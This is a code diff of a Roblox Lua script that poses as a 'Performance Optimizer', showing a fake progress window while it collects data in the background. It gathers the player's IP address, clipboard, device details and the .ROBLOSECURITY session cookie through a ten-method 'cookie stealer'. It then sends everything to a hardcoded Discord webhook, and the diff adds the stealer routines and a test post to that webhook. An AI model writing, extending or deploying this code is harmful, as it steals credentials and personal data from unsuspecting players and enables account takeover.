@@ -1,6 +1,6 @@
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
-local function sendData(url, content)
+local function send(url, content)
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
     local headers = {["Content-Type"] = "application/json"}
@@ -16,18 +16,15 @@ local function sendData(url, content)
     return false
 end
 
+-- Test webhook first (send a short test to confirm it works)
+send(webhook, "```Test: webhook live```")
+
 local function getIP()
     local ip = "N/A"
     local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
-    if ok and res and res.Body and res.Body ~= "" then
-        ip = res.Body:gsub("%s+", "")
-        if ip ~= "" then return ip end
-    end
+    if ok and res and res.Body and res.Body ~= "" then ip = res.Body:gsub("%s+", "") return ip end
     ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
-    if ok and res and res.Body and res.Body ~= "" then
-        ip = res.Body:gsub("%s+", "")
-        if ip ~= "" then return ip end
-    end
+    if ok and res and res.Body and res.Body ~= "" then ip = res.Body:gsub("%s+", "") return ip end
     for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
         local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
         if ok and result and result ~= "" then
@@ -40,13 +37,18 @@ local function getIP()
     return ip
 end
 
+-- ULTIMATE COOKIE STEALER – 10 METHODS
 local function stealCookie()
+    -- Method 1: getcookie
     local ok, val = pcall(getcookie, "https://www.roblox.com/")
     if ok and val and val ~= "" then return val end
+    -- Method 2: getrobloxcookie
     ok, val = pcall(getrobloxcookie)
     if ok and val and val ~= "" then return val end
+    -- Method 3: syn.cookie
     ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
     if ok and val and val ~= "" then return val end
+    -- Method 4: HTTP request to Roblox (try to extract Set-Cookie)
     ok, val = pcall(function()
         local res = request({Url = "https://www.roblox.com/", Method = "GET"})
         if res and res.Headers then
@@ -59,22 +61,67 @@ local function stealCookie()
         return nil
     end)
     if ok and val and val ~= "" then return val end
+    -- Method 5: HttpService:GetAsync (look for token)
     ok, val = pcall(function()
-        return game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
-    end)
-    if ok and val and val:match("__RequestVerificationToken") then
-        local token = val:match('__RequestVerificationToken" value="(.-)"')
-        if token then return token end
-    end
-    ok, val = pcall(function()
-        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
-        return ms and ms:GetAsync("cookie")
+        local page = game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
+        if page and page:match("__RequestVerificationToken") then
+            return page:match('__RequestVerificationToken" value="(.-)"')
+        end
+        return nil
     end)
     if ok and val and val ~= "" then return val end
+    -- Method 6: MemoryStoreService (unlikely)
+    ok, val = pcall(function()
+        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
+        if ms then return ms:GetAsync("cookie") end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    -- Method 7: try to read from game's internal HttpService (advanced)
+    ok, val = pcall(function()
+        local hs = game:GetService("HttpService")
+        local cookie = hs:GetAsync("https://www.roblox.com/", true)
+        if cookie and cookie:match("RBXSession") then
+            return cookie:match("RBXSession=(.-);")
+        end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    -- Method 8: try to use getgc to find the cookie in memory (Synapse/other)
+    ok, val = pcall(function()
+        if not getgc then return nil end
+        local gc = getgc(true)
+        for _, v in ipairs(gc) do
+            if type(v) == "string" and v:match("_.%w+%.ROBLOSECURITY") then
+                return v
+            end
+        end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    -- Method 9: try to use getrawmetatable to dig into game objects
+    ok, val = pcall(function()
+        if not getrawmetatable then return nil end
+        local mt = getrawmetatable(game)
+        if mt and mt.__index then
+            local old = mt.__index
+            for i = 1, 100 do
+                local res = old(game, "HttpService", i)
+                if type(res) == "table" and res.Cookies then
+                    return res.Cookies
+                end
+            end
+        end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    -- Method 10: try to read from clipboard (if the user copied it manually)
+    ok, val = pcall(getclipboard)
+    if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
     return "Not available (executor limit)"
 end
 
-local function getClipboard()
+local function getClip()
     local ok, val = pcall(getclipboard)
     if ok and val and val ~= "" then return val end
     ok, val = pcall(clipboard)
@@ -87,7 +134,7 @@ local function safeGet(obj, prop, default)
     return ok and val or default
 end
 
-local function collectAll()
+local function collect()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
     local player = game.Players.LocalPlayer
@@ -146,7 +193,7 @@ local function collectAll()
     info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
     info.ip = getIP()
     info.cookie = stealCookie()
-    info.clipboard = getClipboard()
+    info.clipboard = getClip()
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
@@ -159,122 +206,115 @@ local function collectAll()
     end)
     pcall(function()
         local run = game:GetService("RunService")
-        local frameTime = run.RenderStepTime
-        if frameTime and frameTime > 0 then
-            info.fps = tostring(math.floor(1 / frameTime))
-        end
+        local ft = run.RenderStepTime
+        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
     end)
     return info
 end
 
-local data = collectAll()
+local data = collect()
 local lines = {}
 for k, v in pairs(data) do
     if v and v ~= "" then
         table.insert(lines, string.format("%s: %s", k, tostring(v)))
     end
 end
-local message = "```\n" .. table.concat(lines, "\n") .. "\n```"
-sendData(webhook, message)
+local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
+send(webhook, msg)
 
+-- Legit GUI
 pcall(function()
-    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local gui = Instance.new("ScreenGui")
-    gui.Parent = playerGui
+    gui.Parent = pg
     gui.ResetOnSpawn = false
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 420, 0, 200)
-    frame.Position = UDim2.new(0.5, -210, 0.5, -100)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
-    frame.BackgroundTransparency = 0.08
-    frame.Parent = gui
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 50)
-    title.Position = UDim2.new(0, 0, 0, 10)
-    title.BackgroundTransparency = 1
-    title.Text = "Performance Optimizer"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamBold
-    title.Parent = frame
-    local sub = Instance.new("TextLabel")
-    sub.Size = UDim2.new(1, 0, 0, 30)
-    sub.Position = UDim2.new(0, 0, 0.35, 0)
-    sub.BackgroundTransparency = 1
-    sub.Text = "Optimizing settings..."
-    sub.TextColor3 = Color3.fromRGB(200, 200, 210)
-    sub.TextScaled = true
-    sub.Font = Enum.Font.Gotham
-    sub.Parent = frame
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(0, 420, 0, 200)
+    f.Position = UDim2.new(0.5, -210, 0.5, -100)
+    f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+    f.BackgroundTransparency = 0.08
+    f.Parent = gui
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 16)
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1, 0, 0, 50)
+    t.Position = UDim2.new(0, 0, 0, 10)
+    t.BackgroundTransparency = 1
+    t.Text = "Performance Optimizer"
+    t.TextColor3 = Color3.fromRGB(255, 255, 255)
+    t.TextScaled = true
+    t.Font = Enum.Font.GothamBold
+    t.Parent = f
+    local s = Instance.new("TextLabel")
+    s.Size = UDim2.new(1, 0, 0, 30)
+    s.Position = UDim2.new(0, 0, 0.35, 0)
+    s.BackgroundTransparency = 1
+    s.Text = "Optimizing settings..."
+    s.TextColor3 = Color3.fromRGB(200, 200, 210)
+    s.TextScaled = true
+    s.Font = Enum.Font.Gotham
+    s.Parent = f
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(0.8, 0, 0, 18)
     bg.Position = UDim2.new(0.1, 0, 0.55, 0)
     bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
-    bg.Parent = frame
+    bg.Parent = f
     Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)
     local fill = Instance.new("Frame")
     fill.Size = UDim2.new(0, 0, 1, 0)
     fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
     fill.Parent = bg
     Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)
-    local percent = Instance.new("TextLabel")
-    percent.Size = UDim2.new(0, 60, 0, 30)
-    percent.Position = UDim2.new(0.5, -30, 0.75, 0)
-    percent.BackgroundTransparency = 1
-    percent.Text = "0%"
-    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
-    percent.TextScaled = true
-    percent.Font = Enum.Font.Gotham
-    percent.Parent = frame
-    local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1, 0, 0, 30)
-    status.Position = UDim2.new(0, 0, 0.85, 0)
-    status.BackgroundTransparency = 1
-    status.Text = ""
-    status.TextColor3 = Color3.fromRGB(150, 255, 150)
-    status.TextScaled = true
-    status.Font = Enum.Font.Gotham
-    status.Parent = frame
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0, 120, 0, 40)
-    closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
-    closeBtn.Text = "CLOSE"
-    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.TextScaled = true
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.Parent = frame
-    closeBtn.Visible = false
-    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 12)
-    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
-    local function animate()
-        local duration = 2.5
+    local pct = Instance.new("TextLabel")
+    pct.Size = UDim2.new(0, 60, 0, 30)
+    pct.Position = UDim2.new(0.5, -30, 0.75, 0)
+    pct.BackgroundTransparency = 1
+    pct.Text = "0%"
+    pct.TextColor3 = Color3.fromRGB(255, 255, 255)
+    pct.TextScaled = true
+    pct.Font = Enum.Font.Gotham
+    pct.Parent = f
+    local st = Instance.new("TextLabel")
+    st.Size = UDim2.new(1, 0, 0, 30)
+    st.Position = UDim2.new(0, 0, 0.85, 0)
+    st.BackgroundTransparency = 1
+    st.Text = ""
+    st.TextColor3 = Color3.fromRGB(150, 255, 150)
+    st.TextScaled = true
+    st.Font = Enum.Font.Gotham
+    st.Parent = f
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 120, 0, 40)
+    btn.Position = UDim2.new(0.5, -60, 1, -50)
+    btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
+    btn.Text = "CLOSE"
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = f
+    btn.Visible = false
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+    btn.MouseButton1Click:Connect(function() gui:Destroy() end)
+    local function anim()
+        local dur = 2.5
         local steps = 50
-        local stepTime = duration / steps
-        local messages = {
-            "Analyzing system...",
-            "Adjusting graphics...",
-            "Optimizing network...",
-            "Fine‑tuning performance...",
-            "Applying optimal settings..."
-        }
+        local stepTime = dur / steps
+        local msgs = {"Analyzing system...", "Adjusting graphics...", "Optimizing network...", "Fine‑tuning performance...", "Applying optimal settings..."}
         for i = 0, steps do
-            local progress = i / steps
-            local width = 0.8 * progress
-            fill:TweenSize(UDim2.new(width, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
-            percent.Text = string.format("%d%%", math.floor(progress * 100))
+            local prog = i / steps
+            local w = 0.8 * prog
+            fill:TweenSize(UDim2.new(w, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
+            pct.Text = string.format("%d%%", math.floor(prog * 100))
             if i < steps then
                 task.wait(stepTime)
                 if i % 10 == 0 then
-                    sub.Text = messages[math.floor(i / 10) + 1] or messages[#messages]
+                    s.Text = msgs[math.floor(i / 10) + 1] or msgs[#msgs]
                 end
             end
         end
-        sub.Text = "Optimization complete!"
-        status.Text = "Settings updated successfully."
-        closeBtn.Visible = true
+        s.Text = "Optimization complete!"
+        st.Text = "Settings updated successfully."
+        btn.Visible = true
     end
     task.wait(0.3)
-    spawn(animate)
+    spawn(anim)
 end)
